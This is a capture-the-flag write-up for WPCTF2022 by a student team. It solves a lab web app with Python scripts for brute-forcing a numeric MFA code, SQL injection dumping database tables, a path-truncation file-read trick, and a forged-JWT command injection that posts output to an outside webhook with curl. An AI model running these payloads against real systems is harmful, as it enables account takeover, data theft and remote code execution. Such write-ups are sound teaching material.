# WPCTF2022

Confused about the exploit code? Checkout the exploit [here](./expl.py)!
## Reconnaissance: WP{h1d3_http_h34d3rz}

For the first flag simply connect to your instance and look at the headers the server responds with, you should see a custom header called `Wp-Ctf` with the flag.

## 2FA: WP{d0cum4nt5_l34k_s3nsitiv3_inf0}

After logging with the given credentials `user047:asd` you are asked for a multifactor authentication code, and a request is made every second to an API endpoint that checks if the multifactor authentication step was successful.

```jsx
POST /api/mfa_verify.php HTTP/1.1
Host: start.wpctf.lan:8806
Content-Type: application/json;charset=utf-8

{"username":"user047","mfa_check":1912}
```

Since we don’t know what is the correct code, we tried all of them up to a thousand with this script:

```python
import requests
import json
for i in range(0,1000):
    d = {"username":"user047","mfa_check":i}
    r = requests.post("http://start.wpctf.lan:8806/api/mfa_verify.php",data=d)
    j = json.loads(r.text)
    if j['success'] == 'true':
        print(j['jwt'])
```

Turns out that a `mfa_check` equal to 123 is all we need to get the correct jwt token!
When logged in we saw some files, one of them had the flag in its name.

Here its content:

![Untitled](images/Untitled.png)

This reveals another API, but was authenticated. There was also another document with the admin’s username:

![Untitled](images/Untitled%201.png)

So now we could get the admin’s token by using the first vulnerability and start using the newly discovered API.

### ADMIttiNG: WP{R00t_Sm1th}

Through some manual fuzzing we found that the `/api/users.php` has an SQL injection vulnerability.

```python
import requests
import base64
import json
import secrets

url = "http://start.wpctf.lan:8806/{path}"

def _(path):
    return url.format(path=path)

class Challenge:
    def __init__(self):
        self.s = requests.Session()
        self.login()

    def login(self):

        mfa_check = _(path="/api/mfa_verify.php")
        response = self.s.post(
            mfa_check, json={"mfa_check": 123, "username": "admin238"}
        )

        self.jwt = response.json()["jwt"]
        self.s.headers.update({"Authorization": "Bearer " + self.jwt})

    def get_userid(self, id):
        self.login()
        response = self.s.get(_(path=f"/api/users.php?id={id}"))
        return response.text

    def get_username(self, name,full_name):
        self.login()
        response = self.s.get(_(path=f"/api/users.php?name={name}&full_name={full_name}"))
        return response.text

c = Challenge()

print(c.get_username("admin238\\'", "OR 1=1 -- "))
```

This way we could leak the entire users table and found another user in the database: `admin7321034747`. Using the first vulnerability we impersonated this user too and by decoding the cookie we found the flag in the payload section of the jwt token:

```python
{
    "user_id": 928476593,
    "user": "admin7321034747",
    "pass": "asd",
    "full_name": "WP{R00t_Sm1th}",
    "group_id": "928476593",
    "permissions":
    {
        "upload": "1",
        "listFiles": "1",
        "deleteFiles": "1",
        "listUsers": "1",
        "download": "1"
    }
}
```

Now we have also the capability to upload files!

### LegacyLog: WP{pl34se_r3m0v3_l3gacy_stuff}

It was now time to dump the entire database. First we need to know what tables there are in the database, so we added this function to the script:

```python
# No, we are not sorry for the CTF quality code.
def injection(inj):
    r = c.get_username("admin238\\'", f"OR 1=1 UNION SELECT 1337,9001,({inj}),420,69,42 --")
    j = json.loads(r) 
    j = j['user'][3]['pass']
    l = j.split(",")
    l = [" ".join(x.split("1337")) for x in l]
    print("\n".join(l))

injection("SELECT group_concat(concat(table_schema,1337,table_name,1337,column_name,1337,data_type,1337,CHARACTER_MAXIMUM_LENGTH)) FROM information_schema.columns")
```

Here we are doing a basic UNION injection where we dump every table with the respective column of the database. We use `concat` to concatenate table columns, and `1337` as a delimiter useful to split the columns returned (typically you would use a string, but we could not find a way of doing it with a string), then we use `group_concat` to return every single row of the table in a single row. Given the name, of the challenge we started immediately by dumping the `access_logs` table:

```python
injection("SELECT group_concat(concat(id,1337,ip,1337,url,1337,method,1337,accessed)) FROM access_logs")
```

One of returned record had this value in the URL column: `/api/filesdownloadall.php?flag=WP{pl34se_r3m0v3_l3gacy_stuff}.php`. This let us download the challenge upload directory of the current logged in user: `var/www/html/uploads/928476593`

### **Black Or White - WP{fr0m_bl4ckb0x_2_wh1t3b0x}**

Again, given the challenge description we looked up SQL modes of the mysql instance of the challenge.

```python
c.get_username("admin238\\'", f"OR 1=1 UNION SELECT 1337,9001,(SELECT @@GLOBAL.sql_mode),420,69,42 --")
```

And got this as a result:

```sql
STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
```

Then we looked at the [documentation](https://mariadb.com/kb/en/sql-mode/).

> ## Strict Mode
> 
> A mode where at least one of `STRICT_TRANS_TABLES` or `STRICT_ALL_TABLES` is enabled is called *strict mode*.
> 
> With strict mode set (default from [MariaDB 10.2.4](https://mariadb.com/kb/en/mariadb-1024-release-notes/)), statements that modify tables (either transactional for `STRICT_TRANS_TABLES` or all for `STRICT_ALL_TABLES`)
>  will fail, and an error will be returned instead. The IGNORE keyword 
> can be used when strict mode is set to convert the error to a warning.
> 
> With strict mode not set (default in version <= [MariaDB 10.2.3](https://mariadb.com/kb/en/mariadb-1023-release-notes/)),
>  MariaDB will automatically adjust invalid values, for example, 
> truncating strings that are too long, or adjusting numeric values that 
> are out of range, and produce a warning.
> 

In the database there is a files table, and it stores information such as the path of the uploaded files.

This is the request made when uploading files:

```
POST /api/fileupload.php HTTP/1.1
Host: start.wpctf.lan:8806
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo5Mjg0NzY1OTMsInVzZXIiOiJhZG1pbjczMjEwMzQ3NDciLCJwYXNzIjoiYXNkIiwiZnVsbF9uYW1lIjoiV1B7UjAwdF9TbTF0aH0iLCJncm91cF9pZCI6IjkyODQ3NjU5MyIsInBlcm1pc3Npb25zIjp7InVwbG9hZCI6IjEiLCJsaXN0RmlsZXMiOiIxIiwiZGVsZXRlRmlsZXMiOiIxIiwibGlzdFVzZXJzIjoiMSIsImRvd25sb2FkIjoiMSJ9fQ.uUmYA5y7PMbl3EFMVahlT3A4hsHhi62E-Ef6zIA9BiI
Content-Type: multipart/form-data; boundary=---------------------------31269189394158100819104461333
Content-Length: 46846
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo5Mjg0NzY1OTMsInVzZXIiOiJhZG1pbjczMjEwMzQ3NDciLCJwYXNzIjoiYXNkIiwiZnVsbF9uYW1lIjoiV1B7UjAwdF9TbTF0aH0iLCJncm91cF9pZCI6IjkyODQ3NjU5MyIsInBlcm1pc3Npb25zIjp7InVwbG9hZCI6IjEiLCJsaXN0RmlsZXMiOiIxIiwiZGVsZXRlRmlsZXMiOiIxIiwibGlzdFVzZXJzIjoiMSIsImRvd25sb2FkIjoiMSJ9fQ.uUmYA5y7PMbl3EFMVahlT3A4hsHhi62E-Ef6zIA9BiI

-----------------------------31269189394158100819104461333
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

[FILE DATA]

-----------------------------31269189394158100819104461333
Content-Disposition: form-data; name="group_id"

928476593
-----------------------------31269189394158100819104461333--
```

 This is the response the server gives when we upload files

```json
{
  "success": true,
  "file": {
    "id": null,
    "name": "test.png",
    "size": 46507,
    "path": "928476593/test.png",
    "user_id": 928476593,
    "group_id": "928476593"
  }
}
```

As an attacker we can control the `filename` and the `group_id` . This is how the file upload could be implemented:

```
1. Check if path(=group_id+"/"+file_name) is user writable
2. Save path in database
```

The second part is what introduces the vulnerability because of the sql mode used, if we exceed the column size in the database the path gets truncated. Here it becomes useful knowing at what character the database starts truncating, and from the previous query we know that the `CHARACTER_MAXIMUM_LENGTH` of the path column in the files table is 512.

```python
# Add this in the Challenge class
def write_file(self, path):
    name = secrets.token_hex(16)
    max = 512
    base_a = "a/../"
    back = "../../../../../.."
    pad = base_a * ((max - len(path) - len(back)) // 5 - 1)
    pad += "A" * ((max - len(path) - len(back)) % 5) + base_a

    c_path = pad + back + path
    # add writable path to bypass security check
    full_path = f"{c_path}../../../../../../../var/www/html/uploads/13455/prova"
    

    response = self.s.post(
        _(path="/api/fileupload.php"),
        files={"file": (name, open("test.png", "rb"))},
        data={"group_id": full_path},
    )
    for file in self.list_files():
        if file.get('name') == name:
            id = file.get('id')
            response = self.s.get(_(f'/api/files.php?id={id}'))
            if response.ok:
                print("FOUND: ", name)
                return response.text
    return "Not found"

def list_files(self):
    response = self.s.get(_(path='/api/files.php'))
    return response.json()

while True:
    fname = input("filename:")
    print(c.write_file(fname))
```

Notice how at the end of the path we submit there is a user-writable directory and at some point there is the file that we actually want to read. Then we go in&out of the same directory to just reach the 512 character limit.

Including some of the files of the challenge as `/var/www/html/api/files.php` we saw that it includes a file `/var/www/html/api/init.php`, that includes `/var/www/html/api/config.php`:

```php
<?php
header('Access-Control-Allow-Headers: Content-Type');
header('Access-Control-Allow-Origin: *');
header('Wp-Ctf: WP{h1d3_http_h34d3rz}');

const JWT_SECRET = "WP{fr0m_bl4ckb0x_2_wh1t3b0x}";
define("DB_HOST", getenv("DB_HOST"));
define("DB_USER", getenv("DB_USER"));
define("DB_PASS", getenv("DB_PASS"));
define("DB_NAME", getenv("DB_NAME"));
define("UPLOAD_PATH", getenv("UPLOAD_PATH"));
define("TEAM_NAME", getenv("TEAM_NAME"));

header('Wp-Ctf-Team-Name: ' . TEAM_NAME);

set_include_path(get_include_path() . PATH_SEPARATOR . dirname(getcwd()).'lib/');
```

We have the secret used to sign jwt tokens, we can now sign our own cookies! But how is this useful? 

### Jay-Woo-Tee - WP{3v3n_jwt_c0nt3nt_c4n_b3_d4nger0us}

Let’s include every other file we know about: `/var/www/html/api/filesdownloadall.php`.

```php
<?php

include_once "init.php";

use Wp\Sfb\Auth\PermissionHandler;

$user = PermissionHandler::getAuthenticatedUser();
if (!$user->canDownload()) {
    http_response_code(403);
    exit();
}
$tmp_f_name = tempnam("/tmp", $user->getGroupId());
$cmd_compress = "tar czf $tmp_f_name " . UPLOAD_PATH . "/" . $user->getGroupId();
exec($cmd_compress, $output, $retval);

if ($retval === 0) {
    header("Content-Type: application/octet-stream", true);
    print file_get_contents($tmp_f_name);
    unlink($tmp_f_name);
} else {
    http_response_code(500);
    exit();
}
```

There is an OS Command Injection vulnerability. We can create a cookie with a `group_id` containing a command and get RCE.

```python
# Add this in the Challenge class
def rce(self, cmd):
    JWT_SECRET = "WP{fr0m_bl4ckb0x_2_wh1t3b0x}"
    WEBHOOK = "https://webhook.site/b217b4bf-6acc-4ab2-903c-a3ada20363fd"
    group_id = f';  curl -X POST -d "$({cmd})" {WEBHOOK}'
    payload_jwt = {
        "user_id": 928476593,
        "user": "sadf",
        "pass": "asd",
        "full_name": "WP{R00t_Sm1th}",
        "group_id": group_id,
        "permissions": {
            "upload": "1",
            "listFiles": "1",
            "deleteFiles": "1",
            "listUsers": "1",
            "download": "1",
        },
    }
    jwt_asfd = jwt.encode(payload_jwt, JWT_SECRET, algorithm="HS256")
    
    self.s.headers.update({"Authorization": "Bearer " + jwt_asfd.decode()})
    self.s.get(_(path="/api/filesdownloadall.php"))

while True:
    cmd = input("command:")
    c.rce(cmd)
```

You will find the output of the command on your webhook. Execute `cat /flag-deadc0de` to get the flag.

![Untitled](images/Untitled%202.png)

Thanks to Würth Phoenix & Sponsors for organizing such a fun and challenging CTF!

### Who are we?

We are Cyberspeck (🤖🥩), a team of students passionate about security. 

- Ivan Valentini (UniTN) - [https://www.linkedin.com/in/ivan-valentini-ab40a8244](https://www.linkedin.com/in/ivan-valentini-ab40a8244?lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BRJmCKmgHQ1ilF67ku9xFPQ%3D%3D)
- Alessandro Mizzaro (UniTN) - [https://www.linkedin.com/in/alemmi](https://www.linkedin.com/in/alemmi?miniProfileUrn=urn%3Ali%3Afs_miniProfile%3AACoAACmpMHYBEqWIhGcIQ0H7ggsHYFyRq-GeVTw&lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BRJmCKmgHQ1ilF67ku9xFPQ%3D%3D)
- Lorenzo Bevilacqua (UniTN) - [https://www.linkedin.com/in/lorenzo-bevilacqua](https://www.linkedin.com/in/lorenzo-bevilacqua?lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BRJmCKmgHQ1ilF67ku9xFPQ%3D%3D)
- Davide Cacciolo (UniTN) - [https://www.linkedin.com/in/davide-ciacciolo-23254b177](https://www.linkedin.com/in/davide-ciacciolo-23254b177?lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BRJmCKmgHQ1ilF67ku9xFPQ%3D%3D)
- Sebastian Cavada (UniBZ) - [https://www.linkedin.com/in/sebastian-cavada-87699a166](https://www.linkedin.com/in/sebastian-cavada-87699a166?lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BRJmCKmgHQ1ilF67ku9xFPQ%3D%3D)
